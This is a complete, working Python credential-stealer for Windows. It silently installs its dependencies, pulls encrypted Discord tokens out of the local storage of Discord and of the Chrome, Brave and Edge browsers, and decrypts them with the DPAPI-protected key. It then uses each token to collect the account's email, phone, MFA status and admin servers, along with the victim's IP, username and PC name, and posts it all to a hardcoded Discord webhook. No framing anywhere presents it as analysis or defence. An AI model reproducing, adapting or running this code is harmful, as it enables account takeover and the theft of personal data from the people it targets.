import os
import sys
import subprocess
import json
import re
import base64
import datetime
import urllib.request
import urllib.parse
import urllib.error

# Windows-only check
if os.name != "nt":
    sys.exit()

# Auto-install missing modules
def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", pip_name
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([
    ("win32crypt", "pywin32"),
    ("Crypto.Cipher", "pycryptodome"),
])

import win32crypt
from Crypto.Cipher import AES

WEBHOOK_URL = "https://discord.com/api/webhooks/1392044604445954138/PedWgzbgbjntKIyoKKWtFmoGH2neHf_EtQLOdq1sCq82aFlVyyswR5NN6v8FJfBzhRsp"

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")
PATHS = {
    'Discord': os.path.join(ROAMING, 'discord'),
    'Discord Canary': os.path.join(ROAMING, 'discordcanary'),
    'Lightcord': os.path.join(ROAMING, 'Lightcord'),
    'Discord PTB': os.path.join(ROAMING, 'discordptb'),
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data', 'Default'),
    'Brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Microsoft Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data', 'Default'),
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        )
    }
    if token:
        headers["Authorization"] = token
    return headers

def getkey(path):
    try:
        with open(os.path.join(path, 'Local State'), 'r', encoding='utf-8') as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def gettokens(path):
    tokens = []
    db_path = os.path.join(path, 'Local Storage', 'leveldb')
    if not os.path.isdir(db_path):
        return tokens
    for file in os.listdir(db_path):
        if not (file.endswith('.ldb') or file.endswith('.log')):
            continue
        try:
            with open(os.path.join(db_path, file), 'r', errors='ignore') as f:
                for line in f:
                    for part in re.findall(r'dQw4w9WgXcQ:[^"\n]+', line):
                        tokens.append(part)
        except (PermissionError, FileNotFoundError):
            continue
    return tokens

def decode_base64(data):
    try:
        return base64.b64decode(data)
    except Exception:
        return None

def extract_iv_and_payload(decoded):
    if not decoded or len(decoded) < 15:
        return None, None
    return decoded[3:15], decoded[15:]

def create_cipher(key, iv):
    try:
        return AES.new(key, AES.MODE_GCM, iv)
    except Exception:
        return None

def decrypt_payload(cipher, payload):
    try:
        return cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
    except Exception:
        return None

def decrypt_token(enc_b64, key):
    decoded = decode_base64(enc_b64)
    iv, payload = extract_iv_and_payload(decoded)
    if not iv or not payload:
        return None
    cipher = create_cipher(key, iv)
    if not cipher:
        return None
    return decrypt_payload(cipher, payload)

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as r:
            return json.loads(r.read().decode()).get('ip', '')
    except Exception:
        return 'None'

def main():
    checked = []
    for platform, p in PATHS.items():
        if not os.path.isdir(p):
            continue
        key = getkey(p)
        if not key:
            continue
        tokens = gettokens(p)
        for raw in tokens:
            parts = raw.split('dQw4w9WgXcQ:')
            if len(parts) != 2:
                continue
            token = decrypt_token(parts[1], key)
            if not token or token in checked:
                continue
            checked.append(token)

            try:
                req = urllib.request.Request(
                    'https://discord.com/api/v10/users/@me',
                    headers=getheaders(token)
                )
                with urllib.request.urlopen(req) as res:
                    user = json.load(res)

                flags = user.get('flags', 0)
                has_nitro = user.get('premium_type', 0) != 0

                req_guilds = urllib.request.Request(
                    'https://discord.com/api/v10/users/@me/guilds?with_counts=true',
                    headers=getheaders(token)
                )
                with urllib.request.urlopen(req_guilds) as res:
                    guilds = json.load(res)

                admin_guilds = []
                for g in guilds:
                    perm = int(g.get('permissions', 0))
                    if perm & 8 or perm & 32:
                        admin_guilds.append(f"- {g['name']}")

                guild_str = '\n'.join(admin_guilds)

                embed = {
                    'embeds': [{
                        'title': f"New user data: {user.get('username', 'Unknown')}",
                        'description': (
                            "```yaml\n" +
                            f"User ID: {user.get('id', 'None')}\n" +
                            f"Email: {user.get('email', 'None')}\n" +
                            f"Phone: {user.get('phone', 'None')}\n\n" +
                            f"Guilds: {len(guilds)}\n" +
                            f"Admin Permissions:\n{guild_str}\n\n" +
                            f"MFA Enabled: {user.get('mfa_enabled', False)}\n" +
                            f"Flags: {flags}\n" +
                            f"Locale: {user.get('locale', 'None')}\n" +
                            f"Verified: {user.get('verified', False)}\n\n" +
                            f"Has Nitro: {has_nitro}\n" +
                            f"IP: {getip()}\n" +
                            f"Username: {os.getenv('USERNAME', 'Unknown')}\n" +
                            f"PC Name: {os.getenv('COMPUTERNAME', 'Unknown')}\n" +
                            f"Platform: {platform}\n" +
                            f"Token: {token}\n" +
                            "```"
                        ),
                        'color': 3092790
                    }]
                }

                req = urllib.request.Request(
                    WEBHOOK_URL,
                    data=json.dumps(embed).encode('utf-8'),
                    headers=getheaders(),
                    method='POST'
                )
                urllib.request.urlopen(req)

            except Exception as e:
                print(f"Error processing token for {platform}: {str(e)}")
                continue

if __name__ == '__main__':
    main()
